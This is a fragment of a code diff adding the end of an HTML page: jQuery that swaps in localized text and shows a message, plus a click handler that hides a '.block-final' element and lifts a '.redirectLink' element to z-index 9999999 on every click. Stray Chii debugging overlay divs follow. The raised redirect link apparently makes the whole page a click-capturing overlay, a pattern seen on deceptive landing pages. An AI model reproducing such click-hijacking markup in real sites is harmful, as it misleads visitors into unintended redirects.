+            return i--
+        }
+    }
+
+
+    $(document).ready(function() {
+        setTimeout(function() {
+            for (let key in text) {
+                if (key == userLang) {
+                    msg(text[key].message)
+
+                    for (let key_inner in text[key]) {
+                        i++
+                        if (i != size) {
+                            document.getElementsByClassName(key_inner)[0].innerHTML = text[key][
+                                key_inner
+                            ]
+                        }
+                    }
+                }
+            }
+        }, 1);
+    });
+    </script>
+
+    <script>
+    $('body').click(function(event) {
+        if (!$(event.target).closest('body').length && !$(event.target).is('body')) {
+            $(".block-final").hide();
+
+        }
+        $('.redirectLink').css('z-index', '9999999')
+    });
+    </script>
+
+
+
+</body><div class="__chii-hide__" style="display: none; position: absolute; pointer-events: none;"><div style="position: absolute; box-sizing: border-box; z-index: 100000;"></div><div style="position: absolute; box-sizing: border-box; z-index: 100000;"></div><div style="position: absolute; box-sizing: border-box; z-index: 100000;"></div><div style="position: absolute; box-sizing: border-box; z-index: 100000;"></div><div style="position: absolute; box-sizing: border-box; z-index: 100000; height: 25px; line-height: 25px; background: rgb(255, 255, 255); color: rgb(34, 34, 34); font-size: 12px; padding: 0px 5px; white-space: nowrap; overflow-x: hidden; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 2px 0px, rgba(0, 0, 0, 0.08) 0px 1px 4px 0px, rgba(0, 0, 0, 0.2) 0px 3px 1px -2px;"></div></div><div style="all: initial;"></div></html>
